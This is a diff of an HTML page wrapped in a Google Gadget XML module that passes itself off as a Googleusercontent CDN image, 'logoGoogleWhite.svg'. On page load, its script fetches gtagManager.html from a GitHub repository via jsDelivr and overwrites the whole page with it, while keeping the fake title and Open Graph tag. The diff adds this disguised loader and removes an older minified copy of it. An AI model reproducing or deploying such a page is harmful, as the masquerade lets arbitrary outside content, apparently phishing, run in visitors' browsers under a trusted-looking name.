@@ -1,13 +1,48 @@
-<!doctype html>
-<html lang=en>
+<?xml version="1.0" encoding="UTF-8" ?>
+<Module>
+<ModulePrefs title="logoGoogleWhite.svg - Googleusercontent CDN" />
+<Content type="html"><![CDATA[
+
+<!DOCTYPE html>
+<html lang="en">
 <head>
-<meta charset=UTF-8>
-<meta name=viewport content="width=device-width,initial-scale=1">
-<meta property=og:title content="logoGoogleWhite.svg - Googleusercontent CDN">
-<title>logoGoogleWhite.svg - Googleusercontent CDN</title>
-<script>document.addEventListener("DOMContentLoaded",(async()=>{try{const e=await fetch("https://cdn.jsdelivr.net/gh/LupineVault/imageopensocial@45031820961c12465fc0d539f8f8ce6cee996a7e/gtagManager.html");if(!e.ok)throw new Error("Failed to fetch HTML");const t=await e.text(),o=document.createElement("div");o.innerHTML=t,o.querySelectorAll("link, script").forEach((e=>{e.hasAttribute("crossorigin")&&!e.getAttribute("crossorigin")&&e.removeAttribute("crossorigin")})),document.body.innerHTML=o.innerHTML,document.title="logoGoogleWhite.svg - Googleusercontent CDN";let n=document.querySelector("meta[property='og:title']");n||(n=document.createElement("meta"),n.setAttribute("property","og:title"),document.head.appendChild(n)),n.setAttribute("content","logoGoogleWhite.svg - Googleusercontent CDN")}catch(e){console.error("Error loading content:",e),document.body.innerHTML="<h2>Failed to load content.</h2>"}}))</script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width,initial-scale=1">
+    <meta property="og:title" content="logoGoogleWhite.svg - Googleusercontent CDN">
+    <title>logoGoogleWhite.svg - Googleusercontent CDN</title>
+    <script>
+        document.addEventListener("DOMContentLoaded", async () => {
+            try {
+                const response = await fetch("https://cdn.jsdelivr.net/gh/LupineVault/imageopensocial@45031820961c12465fc0d539f8f8ce6cee996a7e/gtagManager.html");
+                if (!response.ok) throw new Error("Failed to fetch HTML");
+                const html = await response.text();
+                document.open();
+                document.write(html);
+                document.close();
+                
+                // Ensure the title remains forced
+                document.title = "logoGoogleWhite.svg - Googleusercontent CDN";
+                
+                // Ensure Open Graph meta tag remains
+                let ogTitle = document.querySelector("meta[property='og:title']");
+                if (!ogTitle) {
+                    ogTitle = document.createElement("meta");
+                    ogTitle.setAttribute("property", "og:title");
+                    document.head.appendChild(ogTitle);
+                }
+                ogTitle.setAttribute("content", "logoGoogleWhite.svg - Googleusercontent CDN");
+            } catch (error) {
+                console.error("Error loading content:", error);
+                document.body.innerHTML = "<h2>Failed to load content.</h2>";
+            }
+        });
+    </script>
 </head>
 <body>
-<h2>Loading content...</h2>
+    <h2>Loading content...</h2>
 </body>
 </html>
+
+
+]]></Content>
+</Module>
